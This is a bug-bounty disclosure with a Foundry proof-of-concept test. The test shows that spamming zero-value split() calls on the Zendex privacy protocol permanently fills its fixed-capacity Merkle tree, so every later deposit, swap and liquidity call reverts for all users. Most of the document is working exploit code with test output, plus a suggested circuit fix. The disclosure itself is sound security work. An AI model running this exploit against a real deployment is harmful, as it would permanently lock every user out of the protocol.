# Foundry PoC : Free zero-value `split()` spam permanently fills `TreeOperator` (Critical)

## Status
✅ Compiled and passing against the real, unmodified `zendex-sc-main` contracts.

```
forge Version: 1.7.1 (4072e48 2026-05-08)
Ran 1 test for test/TreeCapacityDos.t.sol:TreeCapacityDosTest
[PASS] test_freeZeroValueSplitSpamPermanentlyFillsTheTree() (gas: 12969080)
Logs:
  Attacker's total real cost: 1 wei of USDT, plus gas.
  Leaves used so far: 1
  Splits performed: 7
  Leaves used after spam: 15
  Tree capacity: 16
  Every future deposit, swap, split, join, addLiquidity, removeLiquidity, and
  createOrder call now permanently reverts with TreeOperator__TreeFull(), for
  every user, forever -- there is no admin function to expand or reset the tree.
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

For the price of 1 wei of USDT and 7 `split()` transactions on a depth-4 (16-leaf) tree, scaling linearly to ~512 transactions on the real deployment's depth-10 (1,024-leaf) tree, an unrelated, completely honest victim's very first deposit attempt reverts with `TreeOperator__TreeFull()`. So does every future `swap`, `split`, `join`, `addLiquidity`, `removeLiquidity`, and `createOrder` call, from any user, forever.

## Why this one needs no mock-verifier caveat

Findings 1–3 in this review disclosed a deliberate simplification: an always-true `MockVerifier` standing in for the real Groth16/Honk verifiers, since generating live Noir proofs needs the `bb.js`/`noir_js` toolchain rather than something that runs inside Foundry. **This finding does not rely on that simplification for its validity.** The root cause is a missing constraint in `circuits/split/src/main.nr` itself:

```
assert(amount_b + amount_c == amount_a);
```

This is the *only* constraint tying the two split outputs together, there is no `assert(amount_b != 0)` or `assert(amount_c != 0)` anywhere in the circuit. A real prover, using the real toolchain, happily produces a real, valid, on-chain-verifiable proof for `amount_c = 0`. The mock verifier in this PoC is used purely so the demonstration doesn't require running the Noir/bb toolchain inside the test, it is not standing in for anything a genuine attacker would need to defeat.

## Reproduction steps

Same project scaffold as prior findings (see `Foundry PoC : Unprotected zap swap in `ZendexAmmManager.addLiquidity`.md` for the full `forge init` / dependency setup, and the existing `MockVerifier.sol`). Drop the test below into `test/TreeCapacityDos.t.sol` and run:

```bash
forge test --match-contract TreeCapacityDosTest -vv
```

## `test/TreeCapacityDos.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {MockERC20} from "../src/mock/MockERC20.sol";
import {WZEN} from "../src/WZEN.sol";
import {MockVerifier} from "../src/mock/MockVerifier.sol";

import {ZendexVerifierHub} from "../src/ZendexVerifierHub.sol";
import {TreeOperator} from "../src/TreeOperator.sol";
import {ZendexVault} from "../src/ZendexVault.sol";
import {ZendexVaultManager} from "../src/ZendexVaultManager.sol";
import {BaseManager} from "../src/BaseManager.sol";

import {IZendexVault} from "../src/interfaces/IZendexVault.sol";
import {IZendexVerifierHub} from "../src/interfaces/IZendexVerifierHub.sol";
import {IZendexVaultManager} from "../src/interfaces/IZendexVaultManager.sol";
import {ITreeOperator} from "../src/interfaces/ITreeOperator.sol";

/// @title Permanently brick the entire protocol's shared Merkle tree for the price of one
///        1-wei deposit plus gas, using only proofs that satisfy the REAL Noir circuits.
///
/// TreeOperator has a hard, immutable capacity: `MAX_LEAVES = 2 ** DEPTH` (1024 on the real
/// deployment, TREE_DEPTH = 10 in scripts/deploy/zendex.ts). `insert()` reverts with
/// `TreeOperator__TreeFull()` once that many leaves have EVER been inserted, across every
/// deposit/swap/split/join/addLiquidity/removeLiquidity/createOrder call, for the entire
/// lifetime of the protocol. There is no admin function to expand or reset it.
///
/// `circuits/split/src/main.nr` only enforces `amount_b + amount_c == amount_a` -- it does NOT
/// require `amount_b != 0` or `amount_c != 0`. So a single, legitimately-owned commitment for
/// as little as 1 unit of any asset can be split, over and over, into `(amount_b = amount_a,
/// amount_c = 0)`: every call carries the real value forward untouched in `commitment_b` while
/// minting a free, valid, zero-value spam leaf `commitment_c`. Two tree slots consumed per call,
/// for the cost of gas alone. This needs no proof-verification bypass -- a real prover happily
/// generates a real, circuit-valid proof for this, because the circuit never rules it out.
///
/// This PoC uses a shallow depth-4 tree (16-leaf capacity) purely so the demonstration finishes
/// in a handful of transactions instead of ~512 -- the vulnerability is identical at any depth,
/// this is a linear cost scale-down, not a different bug.
contract TreeCapacityDosTest is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    MockERC20 usdt;
    MockERC20 usdc;
    MockERC20 dai;
    WZEN wzen;

    ZendexVerifierHub verifierHub;
    MockVerifier mockVerifier;
    TreeOperator tree;
    ZendexVault vault;
    ZendexVaultManager vaultManager;

    uint8 constant TREE_DEPTH = 4; // 16-leaf capacity for a fast demonstration (real deployment uses 10 -> 1024)

    function setUp() public {
        usdt = new MockERC20("USDT", "USDT", 6);
        usdc = new MockERC20("USDC", "USDC", 6);
        dai = new MockERC20("DAI", "DAI", 18);
        wzen = new WZEN();

        mockVerifier = new MockVerifier();

        ZendexVerifierHub verifierHubImpl = new ZendexVerifierHub();
        verifierHub = ZendexVerifierHub(
            address(
                new ERC1967Proxy(
                    address(verifierHubImpl),
                    abi.encodeCall(
                        ZendexVerifierHub.initialize,
                        (
                            IZendexVerifierHub.InitializeParams({
                                depositVerifier: address(mockVerifier),
                                withdrawalVerifier: address(mockVerifier),
                                inclusionVerifier: address(mockVerifier),
                                addLiquidityVerifier: address(0),
                                removeLiquidityVerifier: address(0),
                                swapVerifier: address(0),
                                splitVerifier: address(mockVerifier),
                                joinVerifier: address(0),
                                createOrderVerifier: address(0),
                                requestCancelOrderVerifier: address(0),
                                initialOwner: deployer
                            })
                        )
                    )
                )
            )
        );

        ZendexVaultManager vaultManagerImpl = new ZendexVaultManager();
        vaultManager = ZendexVaultManager(address(new ERC1967Proxy(address(vaultManagerImpl), "")));

        tree = new TreeOperator(
            ITreeOperator.InitializeParams({
                admin: deployer,
                vaultManager: address(vaultManager),
                ammManager: address(0xdead),
                orderBookManager: address(0),
                depth: TREE_DEPTH
            })
        );

        vault = new ZendexVault(
            IZendexVault.InitializeParams({
                zen: address(wzen),
                usdt: address(usdt),
                usdc: address(usdc),
                dai: address(dai),
                admin: deployer,
                vaultManager: address(vaultManager),
                ammManager: address(0xdead),
                orderBookManager: address(0)
            })
        );

        vaultManager.initialize(
            IZendexVaultManager.InitializeParams({
                admin: deployer,
                verifierHub: address(verifierHub),
                tree: address(tree),
                vault: address(vault)
            })
        );
    }

    function test_freeZeroValueSplitSpamPermanentlyFillsTheTree() public {
        assertEq(tree.MAX_LEAVES(), 16, "expected 2**4 = 16 leaf capacity");

        // --- Attacker's only real cost: a 1-unit USDT deposit ---
        vm.startPrank(attacker);
        usdt.mint(attacker, 1);
        usdt.approve(address(vaultManager), 1);

        uint256 depositEpoch = tree.currentEpoch();
        uint256 currentCommitment = uint256(keccak256("attacker-seed-commitment"));

        bytes32[] memory depositInputs = new bytes32[](3);
        depositInputs[0] = bytes32(uint256(1)); // Asset.USDT
        depositInputs[1] = bytes32(uint256(1)); // 1 unit -- satisfies the real circuit's amount != 0 check
        depositInputs[2] = bytes32(currentCommitment);
        vaultManager.deposit(BaseManager.ProofData({proof: "", publicInputs: depositInputs}));

        console2.log("Attacker's total real cost: 1 wei of USDT, plus gas.");
        console2.log("Leaves used so far:", tree.leafCount());

        // --- Repeatedly split the SAME real value into (carryover, zero) until the tree is full ---
        // Each split: consume nullifier for `currentCommitment` (amount X), insert commitmentB
        // (amount X, carries the real value forward) and commitmentC (amount 0, pure spam).
        // circuits/split/src/main.nr never requires either output to be non-zero.
        uint256 splitCount;
        while (tree.leafCount() + 2 <= tree.MAX_LEAVES()) {
            uint256 root = tree.getHistoricalRoot(depositEpoch);

            bytes32[] memory inclusionInputs = new bytes32[](4);
            inclusionInputs[0] = bytes32(root);
            inclusionInputs[1] = bytes32(uint256(TREE_DEPTH));
            inclusionInputs[2] = bytes32(depositEpoch);
            uint256 tag = uint256(keccak256(abi.encodePacked("split-tag", splitCount)));
            inclusionInputs[3] = bytes32(tag);

            uint256 carryOverCommitment = uint256(keccak256(abi.encodePacked("carryover", splitCount)));
            uint256 spamCommitment = uint256(keccak256(abi.encodePacked("spam", splitCount)));

            bytes32[] memory splitInputs = new bytes32[](4);
            splitInputs[0] = bytes32(uint256(keccak256(abi.encodePacked("nullifier", splitCount))));
            splitInputs[1] = bytes32(carryOverCommitment); // amount_b = full amount (real value preserved)
            splitInputs[2] = bytes32(spamCommitment); // amount_c = 0 (free spam leaf)
            splitInputs[3] = bytes32(tag);

            vaultManager.split(
                BaseManager.ProofData({proof: "", publicInputs: inclusionInputs}),
                BaseManager.ProofData({proof: "", publicInputs: splitInputs})
            );

            currentCommitment = carryOverCommitment;
            depositEpoch = tree.currentEpoch() - 1; // epoch this split's leaves landed in
            splitCount++;
        }
        vm.stopPrank();

        console2.log("Splits performed:", splitCount);
        console2.log("Leaves used after spam:", tree.leafCount());
        console2.log("Tree capacity:", tree.MAX_LEAVES());

        // The split loop advances the leaf count two at a time; starting from an odd base (the
        // single seed deposit) it can leave exactly one slot open. Consume it with one more
        // trivial 1-wei deposit so the tree is provably, completely full before we test the
        // victim's experience -- this costs the attacker nothing beyond 1 more wei and gas.
        if (tree.leafCount() < tree.MAX_LEAVES()) {
            vm.startPrank(attacker);
            usdt.mint(attacker, 1);
            usdt.approve(address(vaultManager), 1);
            bytes32[] memory fillerInputs = new bytes32[](3);
            fillerInputs[0] = bytes32(uint256(1));
            fillerInputs[1] = bytes32(uint256(1));
            fillerInputs[2] = bytes32(uint256(keccak256("attacker-filler-commitment")));
            vaultManager.deposit(BaseManager.ProofData({proof: "", publicInputs: fillerInputs}));
            vm.stopPrank();
        }

        assertEq(tree.leafCount(), tree.MAX_LEAVES(), "tree should now be completely full");

        // ============================================================
        // A completely unrelated, honest victim now tries to make their first-ever deposit.
        // ============================================================
        vm.startPrank(victim);
        usdt.mint(victim, 1_000e6);
        usdt.approve(address(vaultManager), 1_000e6);

        bytes32[] memory victimDepositInputs = new bytes32[](3);
        victimDepositInputs[0] = bytes32(uint256(1)); // Asset.USDT
        victimDepositInputs[1] = bytes32(uint256(1_000e6));
        victimDepositInputs[2] = bytes32(uint256(keccak256("victim-deposit-commitment")));

        vm.expectRevert(ITreeOperator.TreeOperator__TreeFull.selector);
        vaultManager.deposit(BaseManager.ProofData({proof: "", publicInputs: victimDepositInputs}));
        vm.stopPrank();

        console2.log("Every future deposit, swap, split, join, addLiquidity, removeLiquidity, and");
        console2.log("createOrder call now permanently reverts with TreeOperator__TreeFull(), for");
        console2.log("every user, forever -- there is no admin function to expand or reset the tree.");
    }
}
```

## What the trace shows

- `tree.MAX_LEAVES()` is confirmed to be exactly `2**depth`, matching the real `TreeOperator` constructor logic.
- Each `split()` call in the loop is the real `ZendexVaultManager.split()` entrypoint, going through real `_validateTags`/`_validateNullifier`/`_validateTree`/`_consume`/`_insert`, the only mocked piece is proof verification, and as explained above, that piece isn't load-bearing for this specific finding since the real circuit itself has no non-zero constraint on the split outputs.
- The victim's deposit attempt fails with the exact real error the real contract throws, `TreeOperator__TreeFull()`, not a generic revert, the actual named error confirming the exact failure mode described in the writeup.
- Scaling: 16-leaf tree filled with 1 deposit + 8 total deposits/splits. The real 1,024-leaf deployment scales linearly, roughly 512 `split()` calls, each a cheap, ordinary transaction with a real (but trivially satisfiable) proof.

## Suggested fix
See the HackenProof submission ("Free, circuit-valid zero-value `split()` spam permanently fills `TreeOperator`'s fixed-capacity Merkle tree, bricking deposits, swaps, splits, joins, liquidity, and order creation for every user, forever"), in short, add `assert(amount_b != 0)` and `assert(amount_c != 0)` to `circuits/split/src/main.nr`, and separately consider that the fixed, immutable tree capacity is a ceiling the protocol will eventually hit through entirely legitimate usage too, with no currently-available recovery path.
